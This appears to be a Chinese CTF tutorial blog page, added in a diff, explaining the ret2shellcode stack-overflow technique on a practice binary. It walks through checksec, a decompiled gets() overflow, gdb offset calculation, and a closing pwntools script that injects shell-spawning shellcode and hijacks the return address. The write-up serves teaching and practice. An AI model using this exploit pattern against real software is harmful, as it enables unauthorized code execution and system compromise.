@@ -1,0 +1,263 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PWN从入门到放弃(6)——栈溢出之ret2shellcode | 山深有杏&#39;s Blog</title>
+<link rel="shortcut icon" href="https://ssyxsec.com/favicon.ico?v=1735101861265">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ssyxsec.com/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PWN从入门到放弃(6)——栈溢出之ret2shellcode | 山深有杏&#39;s Blog - Atom Feed" href="https://ssyxsec.com/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="上篇我们介绍了ret2text，但是这种利用方式有很大的限制。使用ret2text的前提是，程序中有写好的可返回shell的function。否则，就没办法利用了。
+这篇给大家介绍一个新的利用方法——ret2shellcode，程序中没有s..." />
+    <meta name="keywords" content="CTF,Pwn" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ssyxsec.com">
+  <img class="avatar" src="https://ssyxsec.com/images/avatar.png?v=1735101861265" alt="">
+  </a>
+  <h1 class="site-title">
+    山深有杏&#39;s Blog
+  </h1>
+  <p class="site-description">
+    These Violent Delights Have Violent Ends.
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://ssyxsec.com/0mQfqrf6-n" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              PWN从入门到放弃(6)——栈溢出之ret2shellcode
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-11-07
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="https://ssyxsec.com/tag/mFiLVoNunh/" class="post-tag">
+                  # CTF
+                </a>
+              
+                <a href="https://ssyxsec.com/tag/BcBYBpcwgI/" class="post-tag">
+                  # Pwn
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>上篇我们介绍了ret2text，但是这种利用方式有很大的限制。使用ret2text的前提是，程序中有写好的可返回shell的function。否则，就没办法利用了。</p>
+<p>这篇给大家介绍一个新的利用方法——ret2shellcode，程序中没有shell，那么我们就写一个进去。</p>
+<h3 id="0x00-ret2shellcode">0x00 ret2shellcode</h3>
+<p>ret2shellcode 又称 Return to shellcode 或ret2sc，当程序的data段是可写可执行且位置固定时，我们可将shellcode写到data段上，并通过栈溢出覆盖返回地址到shellcode。</p>
+<h3 id="0x01-例题">0x01 例题</h3>
+<h4 id="1查看文件信息">1）查看文件信息</h4>
+<p>按照国际惯例，先查看文件信息</p>
+<pre><code class="language-javascript">$ file ret2sc
+$ checksec ret2sc
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ssyxsec.com/post-images/1730953203279.png" alt="" loading="lazy"></figure>
+<p>这是一个32位程序，所有保护都没开</p>
+<h4 id="2查看程序大概流程">2）查看程序大概流程</h4>
+<p>运行一下程序，看看程序的大概流程</p>
+<figure data-type="image" tabindex="2"><img src="https://ssyxsec.com/post-images/1730953213035.png" alt="" loading="lazy"></figure>
+<p>程序获取两次用户输入</p>
+<h4 id="3分析程序查找漏洞点">3）分析程序&amp;查找漏洞点</h4>
+<p>将程序扔到ida pro里分析</p>
+<p>首先分析main()函数</p>
+<pre><code class="language-javascript">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [esp+1Ch] [ebp-14h]
+
+  setvbuf(stdout, 0, 2, 0);
+  printf(&quot;Name:&quot;);
+  read(0, &amp;name, 0x32u);
+  printf(&quot;Try your best:&quot;);
+  return gets(&amp;s);
+}
+</code></pre>
+<p>我们看到，程序的两次输入分别是用read()和gets()函数实现的，我们双击进入&amp;name变量中</p>
+<figure data-type="image" tabindex="3"><img src="https://ssyxsec.com/post-images/1730953223043.png" alt="" loading="lazy"></figure>
+<p>发现name变量存在在bss段中，且长度足够，不存在溢出</p>
+<p>我们再进入&amp;s变量看一下</p>
+<figure data-type="image" tabindex="4"><img src="https://ssyxsec.com/post-images/1730953230097.png" alt="" loading="lazy"></figure>
+<p>s变量的大小为0x18，但是gets()函数不会限制我们输入，所以这里是存在栈溢出的</p>
+<p>我们继续查看其它函数，并没有发现可给我们返回shell的函数，这里我们就要自己构造shellcode</p>
+<p>那么我们在什么位置写入shellcode呢？</p>
+<p>将程序导入gdb并运行，ctrl+c将程序中断，利用vmmap查看地址段权限</p>
+<pre><code class="language-javascript">$ gdb ret2sc
+gdb-peda$ r
+# ctrl + c
+gdb-peda$ vmmap
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://ssyxsec.com/post-images/1730953237309.png" alt="" loading="lazy"></figure>
+<p>我们看到bss段是可写可执行的，那么我们就可以将shellcode写入name变量</p>
+<h4 id="4计算溢出偏移">4）计算溢出偏移</h4>
+<p>和之前一样，将程序导入gdb，使用pattern工具计算偏移</p>
+<p>不过这道题目name变量是不存在溢出的，所以我们要在第二次输入的时候输入pattern生成的字符串</p>
+<figure data-type="image" tabindex="6"><img src="https://ssyxsec.com/post-images/1730953255823.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://ssyxsec.com/post-images/1730953261973.png" alt="" loading="lazy"></figure>
+<p>计算出溢出偏移为32，接下来我们就可以构造payload了</p>
+<h4 id="5构造payload">5）构造payload</h4>
+<pre><code class="language-javascript">from pwn import *
+
+r = process('./ret2sc')
+elf = ELF('./ret2sc')
+
+padding = 32
+name_addr = 0x0804A060
+
+shellcode = asm(shellcraft.sh())
+r.sendlineafter('Name:',shellcode)
+
+payload = 'a' * padding
+payload += p32(name_addr)
+r.sendlineafter('best:',payload)
+
+r.interactive()
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#0x00-ret2shellcode">0x00 ret2shellcode</a></li>
+<li><a href="#0x01-%E4%BE%8B%E9%A2%98">0x01 例题</a>
+<ul>
+<li><a href="#1%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF">1）查看文件信息</a></li>
+<li><a href="#2%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E5%A4%A7%E6%A6%82%E6%B5%81%E7%A8%8B">2）查看程序大概流程</a></li>
+<li><a href="#3%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E%E7%82%B9">3）分析程序&amp;查找漏洞点</a></li>
+<li><a href="#4%E8%AE%A1%E7%AE%97%E6%BA%A2%E5%87%BA%E5%81%8F%E7%A7%BB">4）计算溢出偏移</a></li>
+<li><a href="#5%E6%9E%84%E9%80%A0payload">5）构造payload</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ssyxsec.com/LW78J1YCzS/">
+              <h3 class="post-title">
+                PWN从入门到放弃(5)——栈溢出之ret2text
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ssyxsec.com/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
